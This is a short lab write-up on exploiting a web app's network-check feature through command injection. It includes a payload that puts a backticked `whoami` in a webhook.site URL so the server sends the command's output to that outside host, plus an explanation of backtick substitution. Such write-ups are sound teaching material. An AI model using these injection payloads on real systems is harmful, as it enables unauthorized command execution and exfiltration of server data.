
# 🌐 Command Injection 0x02: Network Check Exploitation

---

## ❓ Overview of the Lab

This lab demonstrates how a seemingly innocent feature like a network check can be exploited using command injection techniques to run arbitrary commands on the server.

---

## 🛠️ Exploitation Technique

### **User Input**
Entered into the network check target input field:
```bash
https://webhook.site/08c29163-c569-4f1c-b964-503ad450e860/?q=`whoami`
```

---

### **Response from Webhook.site**
Result displayed on the webhook site:
```
https://webhook.site/08c29163-c569-4f1c-b964-503ad450e860/?q=www-data
```

---

## 🤔 Why Use Backticks (`)?

### **Function of Backticks**
In many shell environments (like bash), backticks are used to perform **command substitution**.  
Command substitution is the process where the shell executes the command inside the backticks and substitutes the output of this command in place.

### **Example Explanation**
In the URL:
```
https://webhook.site/.../?q=`whoami`
```
- The shell executes the `whoami` command, which returns the username of the user running the process (e.g., `www-data`).
- The shell replaces the `whoami` command with its output (`www-data`) before sending the URL.

---

## ❌ Why Single Quotes Don’t Work

### **Single Quote Behavior**
- Single quotes are used in shell environments to treat everything inside them as a string literal.
- They do not allow command substitution within them.

### **Implication for Command Injection**
- Using single quotes around `whoami`, like `'whoami'`, would prevent the command from being executed. Instead, it would be treated as part of the URL string, failing to perform command injection.

---

## 📝 Lab Conclusion

- **Successful Command Injection:**  
  The use of backticks in the input allowed execution of a system command (`whoami`), successfully exploiting a command injection vulnerability.  
  This demonstrates the importance of sanitizing and validating all user inputs in web applications to prevent malicious exploitation.

---

## 🌍 Real-World Implications

- **Potential Risks:**  
  This type of vulnerability could allow attackers to gain unauthorized access to system information or perform more dangerous commands, highlighting the critical nature of secure coding practices.

---
